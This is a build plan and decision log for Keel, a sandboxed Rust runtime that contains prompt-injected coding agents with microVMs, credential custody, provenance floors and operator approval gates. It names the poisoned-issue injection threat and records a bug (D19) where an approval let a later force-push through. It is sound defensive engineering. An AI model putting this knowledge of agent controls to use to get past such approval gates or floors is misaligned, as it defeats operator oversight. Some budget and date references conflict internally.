# Keel — build plan v0.3

**A secure local runtime for coding and research agents. One agent, one boundary, in Rust.**

| | |
|---|---|
| Status | Build plan, v0.3 (2026-09-18). Supersedes the v0.2 planning set for anything it contradicts. |
| Audience | A coding agent implementing this, and the operator reviewing its output. |
| Scope | Single vertex. Personal, local, single-operator. No crew, no multi-tenancy, no remote. |
| Prior docs | `ARCHITECTURE.md`, `THREAT-MODEL.md`, `PROJECT-BRIEF.md`, `ROADMAP.md`, `DECISIONS.md` remain the rationale. §14 lists every change this plan makes to them. Where they disagree with this file, this file wins. |

---

## 0. How to use this document

- Build in phase order (§10). Do not start a phase until the previous phase's exit criteria are green in CI.
- §2 invariants are not tasks; they are constraints on every task. Violating one is a build failure, not a review comment.
- Every phase lists **acceptance tests**. Write them first; they are the definition of done.
- When a spec here is silent, choose the option that keeps the TCB smaller and fails closed. Record the choice in `DECISIONS.md` under a new `D<n>` entry.
- The kernel never calls a model. Model assistance is for implementation, not for anything in the decision path.

---

## 1. Threat, in one sentence

> The agent reads a poisoned issue, README, CI log, or web page, and then uses your real authority to do something you cannot undo.

Adversary: anyone who can place text where the agent reads it; a compromised dependency inside the vertex; a model that drifted. Trusted: host kernel, isolation backend, the `keel` trusted crates, the operator input path, the signing keys. Untrusted: the model, the harness, the vertex, every tool result, every guest-written byte, and every host-side crate outside the TCB. Assume the vertex is fully compromised; design for containment.

---

## 2. Invariants (CI-enforced, non-negotiable)

| # | Invariant | Enforcement |
|---|---|---|
| I1 | Trusted crates ≤ 16,000 first-party LOC total, with measured per-crate ratchets and explicit reserve (§4; D39). | `tokei` in CI; inline-test-inclusive per-crate ratchets and the hard ceiling are enforced. |
| I2 | `#![forbid(unsafe_code)]` on every trusted crate. | Grep in CI. |
| I3 | No trusted crate depends on an untrusted crate. | Dependency-direction lint (`cargo metadata` check). |
| I4 | No trusted crate makes a network call to a model endpoint, spawns a process, or loads code at runtime. | Dependency allowlist per trusted crate; `deny.toml`. |
| I5 | `Stamped` has no public constructor outside `keel-kernel`. | Type visibility; a doctest asserts a construction attempt fails to compile. |
| I6 | Nothing outside the TCB makes a live authorization decision. Untrusted host crates ask the PDP; the offline compiler may evaluate synthetic scenarios but cannot authorize runtime actions. | Code review rule + I3. |
| I7 | Real credentials and the MITM CA private key exist only in trusted crate memory. | I3 + no serialization of these types (`!Serialize`, `Zeroize` on drop). |
| I8 | Every action channel is registered with a declared gate class; a channel with no declaration fails startup. | Channel registry, checked at boot. |
| I9 | Operator input (rank-3 capture, approvals) never transits an untrusted crate. | §7 approval channel design. |
| I10 | Generated or hand-written policy is a content-hashed artifact loaded deliberately; never hot-loaded. | Loader refuses unhashed bundles. |
| I11 | Structural invariants (guest cannot modify policy, audit, attestation, provenance, budget) are hardcoded in `keel-kernel` and not expressible in policy. | Not policy-reachable; unit tests. |

---

## 3. Trust boundary (revised)

```
┌──────────────────────── HOST ───────────────────────────────────────────┐
│  TRUSTED (TCB)                                                            │
│  keel-kernel     composition, session facts, budgets, gate, channel reg.  │
│  keel-policy     Cedar evaluation only                                     │
│  keel-provenance classification, floor, rank requirements                 │
│  keel-audit      hash chain + run-bound HMAC, single writer, verifier     │
│  keel-secrets    credential custody, sentinel swap, MITM CA, TLS session  │
│  keel-input      raw tty ownership, operator keystroke classification,    │
│                  approval channel                                          │
│                                                                            │
│  UNTRUSTED (outside TCB)                                                   │
│  keel-isolate    drives microVM backends                                   │
│  keel-conn       accepts guest connections, hands sockets to keel-secrets  │
│                  for TLS; forwards bytes; never sees plaintext             │
│  keel-gitd       kernel-owned git remote (smart HTTP); asks PDP           │
│  keel-mcp        pure relay to backend MCP servers                         │
│  keel-render     transforms guest PTY output into display frames; no tty  │
│  keel-cli        operator surface                                          │
└────────────────────────────┬──────────────────────────────────────────────┘
                             │ vsock / UDS — the only channel
┌────────────────────────────▼──── VERTEX (untrusted) ──────────────────────┐
│  microVM. No route. No DNS. No credentials. Harness speaks MCP, sees      │
│  sentinel keys, sees a stub resolver and a proxy — nothing else.          │
└───────────────────────────────────────────────────────────────────────────┘
```

Changes from v0.2: `keel-egress` is split — TLS termination and injection move into `keel-secrets` (trusted); the untrusted remainder is `keel-conn`. `keel-pty` is split — `keel-input` (trusted) exclusively owns the tty and classifies input; `keel-render` (untrusted) produces normal-mode display frames but never receives the tty file descriptor. `keel-gitd` is new. D24 restored narrow session-policy authoring outside the TCB; D26 subsequently restored the full offline policy compiler and differential Rego verification.

---

## 4. TCB budget

| Crate | Budget (first-party LOC) | Contents |
|---|---|---|
| `keel-kernel` | 5,266 | Composition, session facts, direct exact-action gate, live operator control, effect permits, scoped denials, model-reservation lifecycle, atomic send/grant handoff, budgets, channel registry, pipeline, enforcement state |
| `keel-policy` | 852 | Cedar evaluation, immutable baseline, violations-set, scoped repeated-denial rule, arg role classification, real-path containment |
| `keel-provenance` | 1,321 | Classification, floor, rank table, write-inheritance, hardened host-Git construction, typed denial window |
| `keel-audit` | 1,228 | Hash chain, terminal seal, Ed25519 signing, durable writer, offline verifier, redaction, denial and reservation telemetry |
| `keel-secrets` | 3,338 | Custody, intent-scoped acquisition, TLS-only structural header injection, MITM CA, TLS session, model-endpoint request rewriting, eventstream usage, `SigV4` signing, conservative request settlement |
| `keel-input` | 3,326 | Raw tty, foreground-attachment authentication, input classification, expiring approval channel, child sandboxing, Git-control-file evidence, mux framing, lifecycle status, launcher relay, policy pin, and isolation admission |
| **Allocated crate budgets** | **= 15,331** | |
| **Unallocated reserve** | **669** | |
| **Hard ceiling** | **= 16,000** | |

The per-crate numbers have been reallocated through recorded decisions. D17
moved the total 12,000 → 12,700 for `SigV4` signing and Identity Center
support. D29 set a 14,000 hard ceiling with 1,300 lines unallocated. D30 assigned
25 lines to trusted isolation-mode admission. D31 assigned 916 lines to close
the initial 2026-09-25 security review. D32 assigned the follow-up hardening and
removed the in-process approval signature. D33 assigned the final reserve to
foreground-terminal authentication for mux attachments. D34–D36 subsequently
reduced and reallocated terminal code, D37 moved live floor control into the
kernel, and D38 added admitted per-run model ceilings without changing the
13,997-line allocation. D39 explicitly raised the ceiling to 16,000 and set
the six crate ratchets to the then-measured 15,820-line implementation of
approval liveness, scoped denial history, and conservative model settlement.
D40 moved regression-only code from trusted production `src` into integration
support, and D41 reconciled every ratchet to the resulting measured 12,913
lines, restoring 3,087 lines of explicit reserve without moving the ceiling.
D42 assigns 83 of those reserve lines to the broker's atomic grant-revocation
and readable-EOF guarantees. D43 assigns 38 more to TLS-only credential
substitution and embedded-IPv4 address denial. D44 assigns 313 more to
moving the operator wait off the broker lock, post-approval re-derivation,
scoped reusable grants, and windowed loop detection, D45 assigns 155 more to
task-envelope verdicts stamped on every action and branch-scoped push and PR
narrowing. D47 assigns 435 more to the admission-time confidentiality index
and shadow payload-flow verdicts. D48 assigns 168 more to a model-only
upstream idle timeout and observed-bound settlement of interrupted model
streams. D49 assigns 19 more to waiting for in-flight model reservations,
D50 assigns 7 more to marking connection-setup legs not-applicable, D51 193
more to guest-reported process origins, D52 243 more to push-content
integrity, D54 235 more to the per-turn context digest log, D56 83 more to the
`OpenRouter` provider, D57 249 more to the audited run admission manifest,
D58 176 more to the triage profile's scope, D61 5 more to the read-only
root disk, D62 6 more to recording guest memory, D63 8 more to reading an
unsealed chain's authenticated prefix, and D64 2 more to building the trusted
runtime cleanly on Linux, leaving 669 lines unallocated.
CI checks
allocations plus reserve against the ceiling. Assigning
reserve to a crate requires another recorded decision naming the guarantee
purchased. The reserve is not permission for incidental trusted growth.

State in every write-up: this is **first-party** LOC. `rustls`, `hyper`, `tokio`, `cedar-policy`, `ed25519-dalek` are in the reviewable surface. The budget bounds what *this project* asks a reviewer to read; it does not shrink the dependency graph. Pin all trusted-crate dependencies; `cargo vet` or `cargo crev` audit list checked in.

---

## 5. Decisions resolved for this plan

This table is the running decision log: D1–D9 came from the earlier planning
set, and every later decision is appended here as it is made. The condensed
rationale for each lives in [DECISIONS](DECISIONS.md).

| | Decision | Resolution |
|---|---|---|
| D1 | Backend / platform | **Resolved in Phase 0: macOS-native Virtualization.framework is primary.** A fresh VZ VM booted Keel's static guest, and the guest called a typed MCP tool over virtio-vsock. Docker's private libkrun build aborted internally and is not used. Linux support is deferred and will not be maintained as an equal primary backend. |
| D2 | Policy engine | Cedar at runtime. Rego/`regorus` oracle deferred with Phase 3. Phase 0 must prove Cedar expresses the three stateful rules in §9 with facts passed as context entities, not as pre-digested booleans. If it cannot, flip to Rego at runtime. |
| D3 | Harness into vertex | Pre-verified read-only base image with the harness preinstalled. Transitional: install at boot before the first model call, then lock. Never mount the host install. |
| D4 | Vertex granularity | One vertex per task. Its original persisted-floor continuation rule is superseded by D37: a new broker starts fail closed at rank 0. Vertex fork is the Phase 3 experiment. |
| D5 | Harness credential | Sentinel in guest; OAuth preferred; only the kernel refreshes. Model credential is **path-scoped to `POST /v1/messages`** (§8.3). |
| D6 | Wrap vs host | Keel launches the harness. Launching is not trusting. |
| D7 | Rank granularity | Four ranks **plus a queryable read-set** (`floor_history`, `sources_read`) from Phase 2. The read-set is what the gate renders (§6.4). |
| D8 | Positioning | Research prototype, labelled as such. |
| D9 | IronCurtain | **Resolved in Phase 0: build Keel.** Native macOS VZ provides VM-per-vertex isolation and working virtio-vsock. |
| D10 | Git mediation | Kernel-owned git remote, not command parsing (§7.3). |
| D11 | Egress mode | Transparent intercept (stub resolver + SNI routing) primary; proxy-env fallback. Phase 0 spike. |
| D12 | Floor semantics | Two runtime modes, both built: `floor` (monotonic min, rank shortfall escalates) and `gate-context` (no floor; provenance rendered at every gate). Both in the eval matrix. |
| D13 | Approval UI | Exclusive trusted-terminal takeover, not a second-terminal command or web UI (§7.2). |
| D14 | TCB budget reallocation | Per-crate budgets redistributed inside an unchanged 12,000 total (§4). `keel-secrets` 2,000 → 2,700 and `keel-input` 1,100 → 2,000, funded by `keel-policy` 2,500 → 1,000, `keel-audit` 1,200 → 900, and `keel-provenance` 1,200 → 1,400 net of the kernel. **The displaced budget was unclaimed, not taken from live work:** `keel-policy`'s 2,500 was sized for the Rego differential oracle, which D2 deferred with Phase 3, so the crate is Cedar evaluation only and sits at ~750. Headroom now favours the two crates Phase 2 actually grows (`keel-provenance`, `keel-input`). Anyone moving a per-crate number again must make this same argument in writing: name which crate loses the lines and why that budget is unclaimed. |
| D15 | Enforcement state is a log record, not an API | The kernel derives each boundary's state from the object that enforces it and writes one `kernel.enforcement-state` record at run start and at shutdown (§7.5). `keel status SESSION` reads the authenticated chain; there is no live query and no MCP tool, because a status surface inside the guest would let scope be mistaken for a claim about the environment (`ARCHITECTURE.md` §10) and because the answer is only worth what its log is worth. The record is never a decision input (I6). Vocabulary is `active` / `advisory` / `absent` / `unsupported` with **no `degraded`**: every Keel boundary fails closed, so a state meaning "up, but not really" describes nothing that can occur and would invite running with a boundary down — the exact regression this record exists to catch. Cost: `keel-kernel` 4,000 → 4,200, funded from `keel-provenance` 1,400 → 1,200 (941 actual; the surplus was sized for the vertex-fork comparison Phase 3 measures rather than builds), total unchanged as D14 requires. |
| D16 | A second model provider is decoded, not trusted | Bedrock's `invoke-with-response-stream` answers in a binary framing (`application/vnd.amazon.eventstream`) rather than SSE, so usage settlement needs a frame decoder inside `keel-secrets`. It verifies neither CRC — the bytes already arrived over a TLS session this crate authenticated, and no CRC implementation is on the crate's I4 allowlist — but every framing disagreement fails closed, and base64 is decoded in-house rather than by adding a dependency to the allowlist for thirty lines. Two accounts of one response (the relayed Anthropic `usage` events and the provider's `amazon-bedrock-invocationMetrics`) settle at the **larger**, never their sum: the provider's input count is already a total, so adding it to the cache fields would charge cached tokens twice. Cost: `keel-secrets` 2,700 → 2,900, funded from `keel-input` 2,000 → 1,800 (1,678 actual; the trusted input path — raw tty, classification, approval channel, runtime broker — is complete, so that surplus was sized for work D14 anticipated and Phase 2 has since finished). The decoder alone spent 238 of the 294 lines D14 left, which is why this decision is recorded before the remaining provider work rather than after it. Everything the eventstream and metrics shapes assert here is documentation-derived and **unverified against a live endpoint**; SigV4 request signing is a separate decision and must not start against this budget. |
| D17 | Signing replaces the sentinel rather than substituting a secret — and the cap was raised to pay for it | A regional provider without a bearer token authenticates by computing an `AWS4-HMAC-SHA256` header over the request, so there is no secret to swap in: the guest's `Authorization: Bearer <sentinel>` header is **dropped** and rewritten, along with `x-amz-date`, `x-amz-security-token`, and any guest-supplied payload hash. That is a stronger property than the swap it replaces — the guest holds a string that works nowhere, not even through the broker — and it needed no guest-side or image-side change to get. Identity Center (`aws sso login`) is supported **without any SSO code in the TCB**: `KEEL_AWS_CREDENTIAL_PROCESS` names a command emitting the standard `credential_process` JSON (e.g. `aws configure export-credentials --format process`), so the AWS CLI owns the SSO cache, the portal call, and rotation, and `keel-secrets` owns only "re-run this when the expiry is within 120s." Static keys still work and are still the shape Keel cannot refresh, which `keel doctor` now says out loud. `ring` joins the `keel-secrets` I4 allowlist; it admits no new code to the reviewable surface, because `keel-audit` and `keel-kernel` already use the same pinned version for HMAC-SHA256 and SHA-256. What is **verified**: the key-derivation chain, string-to-sign, and hex encoding reproduce AWS's published `get-vanilla` vector exactly. What is **not**: canonical path encoding against a live endpoint — the one input whose error a signature mismatch cannot distinguish from a bad key, and therefore the likeliest thing here to be wrong on first contact. Cost: `keel-secrets` 2,900 → 3,600 (3,581 actual) and total 12,000 → 12,700, **with no donor at all.** No crate's surplus could absorb 550 lines of signing and credential refresh; freezing `keel-policy` and `keel-audit` at their actuals to find the room would have been accretion with extra steps. The operator chose `SigV4` and Identity Center support over holding 12,000, and that trade is recorded here rather than absorbed. Anyone raising the total again inherits D14's rule in its stronger form: name what the thesis bought, and say why no crate could pay. |
| D18 | The provider a run authenticates with is named, not inferred | An operator holding both an Anthropic key and a Bedrock login has said nothing by holding them, so `keel run --auth api-key|bedrock` names the choice for one run and `KEEL_MODEL_AUTH` carries it to the trusted process, where it outranks every inference. Asked interactively only when both resolve and a terminal is there to ask through; `--auth` skips the question. Two things fall out of making the choice explicit. A bearer token the operator holds but did not choose is now left **unbound** rather than bound to whichever host won, which the old rule could not express because the token was itself the selector. And the guest, which holds no account session and mounts nothing of the operator's configuration, can be pinned to a model with `keel run --model` — falling back to the host's `ANTHROPIC_MODEL` and then `~/.claude/settings.json`, because a default that lives only on the host is not a default the guest can read. Cost: `keel-secrets` 3,600 → 3,700, funded from `keel-provenance` 1,200 → 1,100, total unchanged as D14 requires. |
| D19 | An approval authorizes an action; only an attestation moves the floor | Found live, in the Phase 2 primary scenario: a gate approval called `lift_floor(required)`, raising the **session** floor to the rank the approved action needed. An operator who allowed one egress thereby satisfied the rank precondition of a force-push to the default branch twenty-two audit records later, and that push gate never named the poisoned issue as the rank-0 source. §6.3 had said all along that approval "does **not** lift the floor"; the code had diverged from it, and the divergence was mine — shipped to reduce escalation fatigue, without checking the spec it contradicted. The lift is removed: `lift_floor` now has exactly one caller, the explicit `ActionClass::LiftFloor` action behind `keel floor lift`, which is gated and shows the read-set being vouched for. The reasoning that makes this non-negotiable: the floor describes what untrusted content is in the agent's context, and approving an action removes none of it, so an approval cannot change what the floor is a statement about. The fatigue it was solving was real but misattributed. `minimum_rank` required rank 2 for **every** `Egress`, where §7.1 requires it only for a host outside the run's egress intent; since §6.2 expects a session to reach floor 0 on its first test run, the effect was that every network call escalated for the rest of the session. Narrowing egress to the allowlist boundary removes most of the pressure, and would have stopped the escalation that became the floor-lifting event. The rank check reads the policy's own `intent:egress-host` violation rather than keeping a second copy of the allowlist in the kernel, so the rule name is now a contract between the two. Cost: none; `keel-kernel` 4,161/4,200. |
| D20 | A frame is a slice of the guest's stream, not a unit of it | The display corrupted visibly in every live run: stray `;5;244m` printed as text, and orphaned UTF-8 continuation bytes littered the left margin. The cause was that the trusted terminal owner treated every frame boundary as a safe seam. A pty read ends wherever the scheduler left it — routinely inside a CSI sequence, or inside one of the three-byte box-drawing characters the harness frames its output with — and two things were written at those boundaries anyway. The pending-approval notice was spliced in after each frame, so `\x1b[38` + `\x1b7` was read as garbage and the `;5;244m` that followed printed as text; and output resumed after a trusted-mode takeover began mid-sequence, its opening bytes having been dropped rather than shown, with the same result from the other side. This was not cosmetic: the notice is how an operator learns an approval is waiting, and it was corrupting the screen it was trying to annotate. It also fell hardest exactly when it mattered, because a gate pending means a notice re-asserted on every frame. `DisplayStream` now tracks where the stream is — ground, mid-character, mid-escape, mid-control-sequence, or inside a string-terminated one — and Keel writes only at a seam, deferring a notice to the frame that closes the sequence. Withheld bytes are accounted for rather than merely dropped, so a resume skips the tail of anything whose head the terminal never saw. One tracker is **shared** by every thread that writes to the terminal, because a seam is a property of the stream and not of a writer: the gate thread's notice is usually the one the operator actually sees, since the guest is blocked on the broker's reply and emits nothing further. Cost: `keel-input` 1,800 → 1,900, funded from `keel-provenance` 1,100 → 1,000, total unchanged as D14 requires. Known and not fixed: the reattach replay in `remember_detached_output` truncates its ring buffer at an arbitrary offset, so a resumed session can still paint one burst of debris before the redraw that follows repairs it. |
| D21 | A terminal has one cursor-save register, and it belongs to the guest | D20 was necessary and not sufficient: the display still corrupted after it, because being between sequences does not make a boundary safe. `DECSC` (`\x1b7`) has a single destination, and a second `DECSC` overwrites the first. The harness saves the cursor, paints a status overlay elsewhere, and restores — Keel's notice does the identical thing — so a notice spliced anywhere between the guest's save and its restore leaves the register holding **Keel's** position, and the guest's own `DECRC` then sends the cursor somewhere it never asked to be. Every write after that lands in the wrong cell, which is why the screen showed words missing from where they belonged (their alignment preserved, because nothing was dropped — it was written elsewhere) alongside fragments printed where nothing should be. Confirmed rather than argued: replaying one repaint through `xterm.js` at every boundary the D20 seam rule permitted, **18 of 156 corrupted the screen, and all 18 were inside a save span**. `pyte` was tried first and showed nothing, because it implements save/restore as a stack — a documented deviation from the single register real terminals have, and a reminder that an oracle has to be checked before it is believed. `DisplayStream` now tracks whether the guest is holding a save and keeps out until it ends; `\x1b7` is read off the `Escape` state so a `7` in a parameter list or in ordinary text is not mistaken for one. **Known and accepted:** a splice also clears the terminal's pending wrap, so one landing between the character that fills the last column and the character that should have wrapped costs the guest that second character. The same sweep puts this at 1 boundary in 156. Keeping out of it would mean knowing the cursor's column, and a cursor model is a parser — the thing D20 deliberately refused to put in the trusted base. Declining to also gate on "the previous byte printed something" was measured, not assumed: it closes the wrap case completely but cuts spliceable boundaries from 138 to 13, and a notice that cannot be written is an operator who is never told an approval is waiting, which is worse than one lost character at the right margin. Cost: none; `keel-input` 1,811/1,900. |
| D22 | Stateful terminal rendering and lower-friction approval stay bounded by the same TCB cap | `keel mux` originally terminated the guest's terminal stream in an untrusted `vt100` screen model and emitted complete fixed-viewport repaints with a header and footer. D34 later supersedes that display path with native passthrough after real full-screen applications exposed rendering incompatibilities. Approval distinguishes reviewable exceptions from high-impact actions: after secure attention, routine exceptions use one fresh `A`, while force/default-branch pushes, publication, deletion outside the workspace, PR merges, and floor lifts retain typed challenges. This decision originally let a routine off-intent approval create a kernel-owned host-and-port grant; D12 in the condensed decision log supersedes that implicit behavior by requiring the operator to choose `G` explicitly. The displayed grant expires after 15 minutes or 64 total actions; credential-bearing, endpoint-violating, and high-impact actions cannot create or use one. D32 later removes the in-process single-action token implementation because it crossed no trust boundary. Cost: total unchanged at 12,700. `keel-kernel` 4,200 → 4,375 and `keel-input` 1,900 → 2,025, funded from unused headroom in evaluator-only `keel-policy` 1,000 → 850, `keel-audit` 900 → 800, and completed `keel-secrets` 3,700 → 3,650. The donor crates' code did not change and remain within their new allocations. |
| D23 | Mux command input stays trusted while its rendering stays untrusted | The first mux chrome was a persistent viewport, not the interaction shown in the IronCurtain demo. `Ctrl-A` now enters a bounded command mode in the trusted attachment process, which already owns the real tty; text can be sent to the guest, `/redraw` repairs the viewport, and `/detach` leaves the VM alive. The tab bar, status rows, command-line painting, terminal model, and layout remain display-only. Natural-language policy was intentionally left for a later change; D24 and D26 now provide it without putting an LLM on the runtime allow/deny path. Cost: total unchanged at 12,700. `keel-input` 2,025 → 2,120, funded from unused headroom in evaluator-only `keel-policy` 850 → 800, `keel-provenance` 1,000 → 975, and `keel-audit` 800 → 780. |
| D24 | Natural-language session policy compiles outside the TCB into closed structured facts | `keel-compile` emits a content-hashed draft in a closed schema: exact repository scope, `push:branch`, `pr:create`, exact-host egress, and `deny:force-push`. A distinct accept operation is required before `keel run --policy` can consume it; launch verifies its content hash and current HTTPS GitHub origin. Common wording is handled by conservative deterministic parsing. Unfamiliar wording may be proposed by the host Claude CLI with tools disabled and schema-constrained output, but the same independent validator applies and the model never participates in a runtime decision. The force-push constraint enters Cedar as operator intent beside the raw Git target flag; its `deny:` violation is rejected before the approval gate, credential injection, or execution, so “never” cannot be overridden. Allowed force pushes, default-branch push, merge, publication, broad network, permanent, other negative, and ambiguous clauses block acceptance. Cost: total unchanged at 12,700. `keel-kernel` 4,375 → 4,415, funded by 20 unused lines each from completed `keel-audit` 780 → 760 and `keel-secrets` 3,650 → 3,630; `keel-policy`, `keel-provenance`, and `keel-input` changes fit their existing headroom. D26 supersedes this narrow compiler while preserving accepted V1 artifacts as a runtime compatibility format. |
| D25 | The mux starts with a workspace launcher before any VM exists | Bare `keel mux` opens **Start a secure session** with **New workspace** and **Existing directory**. A new workspace is a managed Git worktree under `~/.local/share/keel/workspaces`; the existing-directory browser returns a candidate that the CLI independently resolves to its Git worktree root. `--workspace PATH` is the noninteractive bypass. The trusted `keel-input` process continues to own the real tty and relays bytes to a sandboxed `keel-render` launcher that receives only pipes; the menu, directory listing, key interpretation, and selection file remain outside the TCB. Credential resolution, the policy broker, and VM boot happen only after selection. D30 later extends this launcher with runtime-profile and V8 entry-file screens while preserving the same trust split. Cost: total unchanged at 12,700. `keel-input` 2,120 → 2,190, funded by unused headroom in `keel-policy` 800 → 790, `keel-provenance` 975 → 945, `keel-audit` 760 → 740, and `keel-secrets` 3,630 → 3,620. |
| D26 | Policy compilation is offline, differential, and hash-pinned at runtime | `keel policy compile` translates natural language into a closed rule IR, emits complete Cedar and independent Rego programs, generates a safe baseline plus a trigger and near-miss for every rule condition, and refuses the artifact unless both engines and an independent Rust expectation agree. Generated rules are restriction-only: `escalate` and `deny` both compile to Cedar `forbid`, with `deny:` IDs remaining non-overridable. Strict Cedar validation, scenario coverage, the Rego result, tool annotations, source text, and both artifact and runtime-bundle hashes travel in one reviewable draft. Acceptance reverifies all generated content; launch verifies the accepted artifact, exact HTTPS GitHub origin, and an independently carried bundle digest before the trusted runtime loads it. The model is a tool-disabled proposer outside the TCB and never runs in an action decision. Cost: total unchanged at 12,700. The runtime pin added 11 lines to `keel-input`; its budget moves 2,190 → 2,210, funded by 20 lines of unused completed `keel-secrets` headroom, 3,620 → 3,600. |
| D27 | Policy is the single user-facing name and compiler surface | `keel policy compile` accepts either `POLICY.md` or `--text "..."`; both inputs use the full D26 compiler and produce `keel-policy-v2` artifacts with `policy:` rule IDs. `keel constitution` remains a hidden parser alias for existing scripts, while accepted V1 session-policy artifacts remain runtime-readable. New help, output, examples, and documentation use only “policy.” This is an untrusted CLI/compiler rename and does not change the TCB budget. |
| D28 | Tabs supervise complete persistent sessions outside the TCB | Each mux tab owns an independent persistent Keel session: VM, broker, audit chain, policy state, and attach socket. The untrusted CLI implements `/new`, `/tab`, `/close`, and `/resume`; the untrusted renderer composes the tab bar from bounded display metadata. Trusted `keel-input` continues to own the tty and adds only bounded lifecycle return codes plus a read-only `STATUS` response distinguishing attached, detached-idle, and detached-pending sessions. Status cannot authorize or mutate an action, and a trusted secure-attention event remains the only way to enter approval mode. Cost: total unchanged at 12,700. `keel-input` 2,210 → 2,219, funded by unused final headroom in `keel-kernel` 4,415 → 4,413, evaluator-only `keel-policy` 790 → 789, `keel-provenance` 945 → 942, and `keel-audit` 740 → 737. |
| D29 | The TCB hard ceiling is 14,000, with 1,300 lines held as unallocated reserve | Planned run admission, verified teardown, and an optional Linux containment shim may require trusted growth beyond the fully allocated 12,700. The operator chose to establish the outer ceiling before implementation. No existing crate receives headroom: its limits remain unchanged and CI requires `12,700 allocated + 1,300 reserved = 14,000`. Consuming reserve requires a later decision assigning an exact amount to a named trusted crate and guarantee. This is a second explicit cap increase, not evidence that any planned feature has been implemented. |
| D30 | V8 is implemented as a harness with one strong mode and one explicit lower-assurance mode | `vm-v8` runs Node/V8 inside the existing no-network microVM and is the recommended path. `v8-sandboxed` runs pinned Deno on the host with a clean environment, workspace-only files, cached-only modules, and network access only to a loopback proxy that speaks the existing kernel-broker protocol. The host mode treats V8/Deno as a semi-trusted core: an engine escape may reach the host, so it requires the closed `isolation:v8-sandboxed` capability, can be granted by accepted natural-language policy, and is never an automatic fallback. Both the CLI and trusted input process validate the mode/harness pair; trusted admission independently requires the downgrade grant. Bare `keel mux` offers Claude/VM, V8/VM, and visibly lower-assurance V8/host profiles, then independently validates the selected worktree and JavaScript entry file; the picker cannot create the host grant. V8 tab labels report the boundary. Engines, SDKs, launchers, proxy, image work, compiler support, and profile-picker changes remain untrusted. Cost: `keel-input` 2,219 → 2,244 from 25 lines of D29 reserve; `12,725 allocated + 1,275 reserved = 14,000`. |
| D31 | The 2026-09-25 security review consumes reserve without raising the hard ceiling | Eight findings are closed with pinned and sandboxed untrusted children, immutable baseline policy restrictions, direct trusted confirmation for host V8, structural credential-header injection, exact one-use Git/GitHub effect permits, fail-closed persistent-session approvals, public-key audit verification, conservative direct-workspace provenance, and a bounded concurrent broker. The trusted allocations move to their verified `tokei` counts: kernel 4,748, policy 847, provenance 942, audit 777, secrets 3,724, and input 2,603. This assigns 916 lines of reserve to named security guarantees: `13,641 allocated + 359 reserved = 14,000`; the hard ceiling does not move. |
| D32 | Follow-up review closes host-Git, audit-completeness, credential-acquisition, and loopback gaps | Trusted input defaults to untrusted and verifies foreground process-group ownership. Host Git clears ambient configuration and disables repository-controlled execution hooks, while admission and teardown commit to Git control files. Audit writes are synced, structurally invalid requests and pre-execution attempts are recorded, and a signed terminal seal detects suffix removal. The in-process approval signature is deleted because it crossed no boundary. GitHub credentials are acquired only for declared PR authority and host V8 receives one loopback port. Allocations become kernel 4,675, policy 847, provenance 963, audit 924, secrets 3,769, and input 2,802: `13,980 allocated + 20 reserved = 14,000`. |
| D33 | Persistent mux approvals require an authenticated foreground terminal | D32 correctly rejected raw attach-socket bytes but also made the normal mux incapable of showing or completing approval prompts. The trusted supervisor now marks its child explicitly, admits an attach client only when the kernel-reported peer PID belongs to the foreground process group of its controlling terminal, and rejects background or terminal-less socket clients before they can forward bytes. This restores the existing secure-attention flow without making a mode-0600 socket sufficient approval authority. The remaining 20-line reserve plus two unused kernel and three unused audit lines move to `keel-input`: kernel 4,673, audit 921, and input 2,827; all trusted budgets are now fully allocated at the unchanged 14,000-line ceiling. |
| D34 | Native passthrough keeps mux controls visible without restoring the incompatible host renderer | Full-screen Claude Code output remains byte-preserving native PTY passthrough. Guest tmux reserves one white status row listing `Ctrl-A` commands, so `/new`, `/tab`, `/close`, `/resume`, `/detach`, and `/approve` remain discoverable without a host terminal model. The footer is untrusted and grants no authority. The original reverse-video pending notice described here was superseded by D35 after it proved incompatible with a diff renderer; Ctrl-] or trusted `Ctrl-A /approve` still enters the actual trusted screen. No TCB allocation changed in this decision. |
| D35 | Trusted takeover preserves every guest byte and repairs the terminal from guest state | D20/D21/D34 treated safe parsing boundaries as sufficient for suppressing or injecting display bytes. That is incompatible with a diff renderer: once one delta is withheld, its private screen model and the real terminal diverge, so later cursor-relative deltas corrupt unrelated cells. Pending approval is now announced only through the terminal title; no row or cursor sequence is inserted into the guest stream. Secure attention waits for the current CSI/OSC/UTF-8 item to finish, then buffers guest output up to 4 MiB while the trusted gate owns the screen. Resume clears the gate, replays the buffer verbatim, bounces the guest PTY width, invokes guest tmux's full refresh, and sends Ctrl-L. Overflow is deliberately lossy but always takes that full-repaint path. Keel does not nest alternate screens because guest tmux may already own the terminal's single 1049 save slot. The resize forwarder also sends initial geometry immediately, closing the startup-size race. A `vt100` regression compares direct output with takeover/replay/repaint and asserts byte preservation across arbitrary frame splits. Cost: `keel-input` 2,921 → 2,941; `13,997 allocated + 3 reserved = 14,000`. |
| D36 | Xterm-headless snapshots supersede passthrough and takeover replay | Live corruption before any approval proved the incremental PTY path itself was unsound across Keel's relay layers, not only during trusted takeover. Restoring Keel's former lightweight Rust `vt100` model was rejected because it had already proved incomplete for Claude Code. The sandboxed untrusted renderer instead pins `@xterm/headless` 6.0.0—the same emulator architecture used by IronCurtain—and `@xterm/addon-serialize` 0.14.0. It consumes every guest byte in write-callback order and emits bounded, length-prefixed replayable snapshots; separately tagged and bounded terminal-generated replies return only to the untrusted guest. Trusted input never parses guest terminal syntax: it validates frame tags and lengths, serializes whole snapshots to the physical terminal, discards them while the trusted gate is active, and requests one fresh snapshot on resume or reattach. Renderer and guest receive identical initial and resize dimensions. The renderer adds no permanent host chrome, preserving guest tmux's `/new`, `/tab`, `/close`, `/resume`, `/detach`, and `/approve` footer; while a gate is pending it temporarily replaces that row with a reverse-video notification, which remains untrusted display rather than approval authority. The old Rust `vt100` mux, trusted seam parser, 4 MiB takeover buffer, delta replay, width bounce, guest refresh injection, and Ctrl-L repair path are deleted. Regression tests cover independently replayable snapshots, CSI and UTF-8 split across input frames, alternate-buffer and mode reset, approval-row restoration, terminal replies, and repaint. The terminal model stays outside the TCB, and `keel-input` remains within its existing allocation; the 14,000-line ceiling does not move. |
